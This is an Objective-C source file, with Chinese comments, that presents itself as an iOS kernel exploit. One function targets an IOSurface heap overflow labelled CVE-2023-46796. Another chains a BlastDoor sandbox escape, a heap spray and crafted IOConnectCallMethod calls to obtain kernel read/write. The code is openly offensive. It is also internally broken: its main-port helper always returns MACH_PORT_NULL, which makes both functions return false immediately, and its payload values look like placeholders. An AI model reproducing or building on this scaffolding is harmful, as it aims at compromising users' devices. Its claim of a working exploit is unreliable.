#import "IOSurfaceExploit.h"
#import "KernelExploitBase.h"
#import "KernelMemory.h"
#import "BlastDoorExploit.h"
#import "HeapSpray.h"

// 获取iOS的IOKit主端口（替代IOMasterPort函数）
mach_port_t IOKitGetMainPort(void) {
    // 在iOS中，IOMasterPort和kIOMasterPortDefault都不可用
    // 直接使用MACH_PORT_NULL作为主端口
    return MACH_PORT_NULL;
}

bool exploit_iosurface_memory_corruption(void) {
    NSLog(@"[*] 尝试IOSurface内存损坏漏洞 (CVE-2023-46796)...");
    
    // 使用IOKitGetMainPort替代kIOMasterPortDefault
    mach_port_t mainPort = IOKitGetMainPort();
    if (mainPort == MACH_PORT_NULL) return false;
    
    io_service_t service = IOServiceGetMatchingService(mainPort, 
                           IOServiceMatching("IOSurfaceRootUserClient"));
    if (service == IO_OBJECT_NULL) return false;
    
    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return false;
    
    // 准备恶意参数
    uint32_t dict_size = 4096;
    uint64_t *properties = calloc(1, dict_size);
    if (!properties) return false;
    
    // 精心构造的键值将导致堆溢出
    uint32_t key_index = 0;
    properties[key_index++] = 'AAAA'; // 标记
    properties[key_index++] = 'size'; // 键
    properties[key_index++] = 4096; // 大小
    properties[key_index++] = 'heap'; // 堆操作键
    properties[key_index++] = 8192; // 超大缓冲区大小
    properties[key_index++] = 0x1337; // 特殊标记
    
    // 触发漏洞
    kr = IOConnectCallMethod(connection, 
                           6, // createSurface
                           NULL, 0,
                           properties, dict_size,
                           NULL, NULL, NULL, NULL);
    
    free(properties);
    IOServiceClose(connection);
    
    // 检查是否获得内核读写能力
    if (test_kernel_memory_access()) {
        g_has_kernel_access = true;
        return true;
    }
    
    return false;
}

bool exploit_iosurface_blastdoor_chain(void) {
    NSLog(@"[*] 尝试IOSurface+BlastDoor组合漏洞链...");
    
    // 1. 首先通过BlastDoor沙箱逃逸
    bool blastdoor_success = exploit_blastdoor_escape();
    if (!blastdoor_success) {
        NSLog(@"[-] BlastDoor沙箱逃逸失败，无法继续组合链");
        return false;
    }
    
    NSLog(@"[+] BlastDoor沙箱逃逸成功，继续IOSurface漏洞链");
    
    // 2. 获取IOSurface服务
    mach_port_t mainPort = IOKitGetMainPort();
    if (mainPort == MACH_PORT_NULL) return false;
    
    io_service_t service = IOServiceGetMatchingService(mainPort, 
                         IOServiceMatching("IOSurfaceRootUserClient"));
    if (service == IO_OBJECT_NULL) return false;
    
    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return false;
    
    // 3. 准备更复杂的堆布局以提高成功率
    heap_spray(0x1000, 100, 0x4141414141414141); // 建立基础堆喷
    
    // 4. 创建主漏洞触发结构 - iOS 17.6特定格式
    size_t surface_size = 16384;
    uint32_t *surface_data = calloc(1, surface_size);
    if (!surface_data) {
        IOServiceClose(connection);
        return false;
    }
    
    // 5. 填充特定漏洞触发模式
    for (int i = 0; i < surface_size/4; i += 2) {
        surface_data[i] = 0x41414141;
        surface_data[i+1] = 0x42424242;
    }
    
    // 6. 构造IOSurface特殊属性字典
    uint32_t dict_size = 4096;
    uint64_t *properties = calloc(1, dict_size);
    if (!properties) {
        free(surface_data);
        IOServiceClose(connection);
        return false;
    }
    
    // 精心构造的键值将导致堆溢出
    uint32_t key_index = 0;
    properties[key_index++] = 'AAAA'; // 标记
    properties[key_index++] = 'size'; // 键
    properties[key_index++] = 4096; // 大小
    properties[key_index++] = 'data'; // 数据键
    properties[key_index++] = 8192; // 超大缓冲区大小
    properties[key_index++] = 0x4242; // 特殊标记
    properties[key_index++] = 'heig'; // 高度键
    properties[key_index++] = 0x1000; // 高度值
    properties[key_index++] = 'widt'; // 宽度键
    properties[key_index++] = 0x1000; // 宽度值
    properties[key_index++] = 'pixb'; // 像素格式键
    properties[key_index++] = 0x0000; // 像素格式值
    
    // 7. 执行IOSurface漏洞触发
    kr = IOConnectCallMethod(connection, 
                           6, // createSurface
                           NULL, 0,
                           properties, dict_size,
                           NULL, NULL, NULL, NULL);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[+] IOSurface createSurface返回错误可能触发了漏洞: %d", kr);
    }
    
    // 8. 执行额外触发操作
    uint64_t scalarInput[16] = {0};
    scalarInput[0] = 0x1234; // 触发标记
    
    // 注入内存覆写载荷
    struct {
        uint32_t surface_id;
        uint32_t region_size; // 确保显式转换类型
        uint64_t region_addr;
    } structInput = {
        .surface_id = 1,
        .region_size = (uint32_t)surface_size, // 显式转换避免警告
        .region_addr = (uint64_t)surface_data
    };
    
    // 9. 调用特殊IOSurface方法触发漏洞
    kr = IOConnectCallMethod(connection, 11, // 特殊方法选择器
                           scalarInput, 3,
                           &structInput, sizeof(structInput),
                           NULL, NULL, NULL, NULL);
    
    // 释放资源
    free(properties);
    free(surface_data);
    IOServiceClose(connection);
    
    // 10. 检查是否成功获得内核访问权限
    if (test_kernel_memory_access()) {
        g_has_kernel_access = true;
        return setup_kernel_rw_primitive();
    }
    
    return false;
}
